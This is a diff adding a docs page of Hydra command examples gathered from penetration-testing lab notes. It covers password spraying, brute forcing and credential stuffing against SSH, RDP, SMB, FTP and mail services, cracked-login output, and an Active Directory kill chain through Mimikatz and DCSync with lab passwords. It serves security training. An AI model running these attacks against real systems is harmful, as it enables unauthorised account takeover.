@@ -1,0 +1,283 @@
+---
+title: "Hydra"
+sidebarTitle: "Hydra"
+description: "Commands and examples collected from your Hydra notes."
+keywords: ["Hydra", "hydra"]
+boost: 10
+hideFooterPagination: true
+---
+
+{/* Generated from Commands/hydra.md. Edit the Markdown source, then run scripts/sync_site.py. */}
+
+[Search this tool’s saved examples](/commands/notebook?tool=hydra) · [All tools](/index)
+
+## Credential stuffing
+
+**Notebook example**
+
+```bash
+hydra -C user_pass.list ssh://10.100.38.23
+```
+
+Saved as written; may include lab values or terminal output.
+
+[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
+
+## Notebook recipes
+
+16 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
+
+<AccordionGroup>
+
+<Accordion title="2. Password spraying">
+
+### 2. Password spraying
+
+**Active Directory Attack Path: Worked Lab**
+
+```bash
+# SSH spray (Hydra)
+hydra -L usernames.txt -p 'Texas123!@#' <DMZ_IP> ssh
+#   -> [22][ssh] login: jbetty  password: Texas123!@#
+
+# SMB spray once internal (NetExec) — ONE password across users:
+nxc smb <DC> -u usernames.txt -p 'Texas123!@#' --continue-on-success | grep '[+]'
+```
+
+</Accordion>
+
+<Accordion title="🗺️ The kill chain (this assessment)">
+
+### 🗺️ The kill chain (this assessment)
+
+**Active Directory Attack Path: Worked Lab**
+
+```text
+OSINT (Betty Jayde)
+   ↓  namebuster  → username list
+Password spraying (Hydra, SSH)
+   ↓  jbetty : Texas123!@#
+SSH foothold (DMZ01)
+   ↓  chisel / ligolo pivot into 172.16.119.0/24
+Credential discovery (.bash_history)
+   ↓  hwilliam : dealer-screwed-gym1
+SMB share looting (FILE01)
+   ↓  Employee-Passwords_OLD.psafe3
+Crack the vault (pwsafe2john + john)
+   ↓  bdavid, stom (OLD), hwilliam
+BloodHound → bdavid = local admin on JUMP01 ; stom ∈ Domain Admins
+   ↓
+RDP to JUMP01 as bdavid (local admin)
+   ↓  SeImpersonate → SYSTEM  (PrintSpoofer / GodPotato)
+Mimikatz → LSASS → stom's CURRENT password
+   ↓  stom : calves-warp-learning1  (Domain Admin)
+DCSync against DC01
+   ↓  Administrator NTLM + krbtgt
+FULL DOMAIN COMPROMISE
+```
+
+</Accordion>
+
+<Accordion title="Hydra - Password Attack">
+
+### Hydra - Password Attack
+
+**Attacking Email Services: Module Notes**
+
+```text
+grcic550@htb[/htb]$ hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
+
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-04-13 11:37:46
+[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 67 login tries (l:67/p:1), ~5 tries per task
+[DATA] attacking pop3://10.10.110.20:110/
+[110][pop3] host: 10.129.42.197   login: john   password: Company01!
+1 of 1 target successfully completed, 1 valid password found
+```
+
+</Accordion>
+
+<Accordion title="Hydra - RDP Password Spraying">
+
+### Hydra - RDP Password Spraying
+
+**Attacking RDP: Module Notes**
+
+```text
+grcic550@htb[/htb]# hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
+
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-08-25 21:44:52
+[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
+[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
+[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 8 login tries (l:2/p:4), ~2 tries per task
+[DATA] attacking rdp://192.168.2.147:3389/
+[3389][rdp] host: 192.168.2.143   login: administrator   password: password123
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-08-25 21:44:56
+```
+
+</Accordion>
+
+<Accordion title="Misconfigurations">
+
+### Misconfigurations
+
+**Common Services: Full Module Reference**
+
+```bash
+grcic550@htb[/htb]# hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
+```
+
+</Accordion>
+
+<Accordion title="Password Attacks">
+
+### Password Attacks
+
+**Common Services: Full Module Reference**
+
+```bash
+grcic550@htb[/htb]$ hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
+```
+
+</Accordion>
+
+<Accordion title="Phase 0 — Credential Access (Hydra + rockyou.txt against FTP)">
+
+### Phase 0 — Credential Access (Hydra + rockyou.txt against FTP)
+
+**Common Services: Personal Assessment Notes**
+
+```text
+hydra -l fiona -P /usr/share/wordlists/rockyou.txt ftp://10.129.78.187
+```
+
+</Accordion>
+
+<Accordion title="When there&#x27;s no anonymous access: brute force">
+
+### When there's no anonymous access: brute force
+
+**FTP Enumeration and File Access**
+
+```bash
+hydra -l <user> -P /usr/share/wordlists/rockyou.txt -t 4 ftp://<IP>
+hydra -L users.txt -P passwords.txt -t 4 <IP> ftp -V
+```
+
+</Accordion>
+
+<Accordion title="Attacking SSH">
+
+### Attacking SSH
+
+**Linux Remote Access: SSH, Rsync, and R-Services**
+
+```bash
+hydra -l <user> -P /usr/share/wordlists/rockyou.txt -t 4 ssh://<IP>
+```
+
+</Accordion>
+
+<Accordion title="RDP (3389)">
+
+### RDP (3389)
+
+**Password Attacks: Cracking, Files, and Credential Stores**
+
+```bash
+hydra -L user.list -P password.list rdp://10.129.42.197
+xfreerdp /v:10.129.42.197 /u:user /p:password     # connect with GUI
+```
+
+</Accordion>
+
+<Accordion title="SMB (445)">
+
+### SMB (445)
+
+**Password Attacks: Cracking, Files, and Credential Stores**
+
+```bash
+hydra -L user.list -P password.list smb://10.129.42.197
+```
+
+</Accordion>
+
+<Accordion title="SSH (22)">
+
+### SSH (22)
+
+**Password Attacks: Cracking, Files, and Credential Stores**
+
+```bash
+hydra -L user.list -P password.list ssh://10.129.42.197
+ssh user@10.129.42.197                  # log in once cracked
+```
+
+</Accordion>
+
+<Accordion title="Brute-forcing credentials with Hydra">
+
+### Brute-forcing credentials with Hydra
+
+**Read and Search Email with POP3 and IMAP**
+
+```bash
+# Plaintext ports
+hydra -l <username> -P passwords.txt -t 4 <IP> pop3 -V
+hydra -L users.txt   -P passwords.txt -t 4 <IP> imap -V
+
+# SSL/TLS ports — add -S and point -s at the secure port
+hydra -l <username> -P passwords.txt -S -s 995 -t 4 <IP> pop3 -V
+hydra -l <username> -P passwords.txt -S -s 993 -t 4 <IP> imap -V
+```
+
+</Accordion>
+
+<Accordion title="When you have/seek credentials">
+
+### When you have/seek credentials
+
+**SMTP Enumeration and Relay Checks**
+
+```bash
+hydra -l <user> -P passwords.txt -t 4 smtp://<IP>
+```
+
+</Accordion>
+
+<Accordion title="Quick reference">
+
+### Quick reference
+
+**FTP Enumeration and File Access**
+
+Context from the notebook: No anon? hydra ... ftp://&lt;IP>
+
+```text
+hydra ... ftp://<IP>
+```
+
+</Accordion>
+
+<Accordion title="Default credentials">
+
+### Default credentials
+
+**Password Attacks: Cracking, Files, and Credential Stores**
+
+Context from the notebook: Also check vendor documentation and router default-credential lists. Build a  user:pass  list and feed it to  hydra -C .
+
+```text
+hydra -C
+```
+
+</Accordion>
+
+</AccordionGroup>
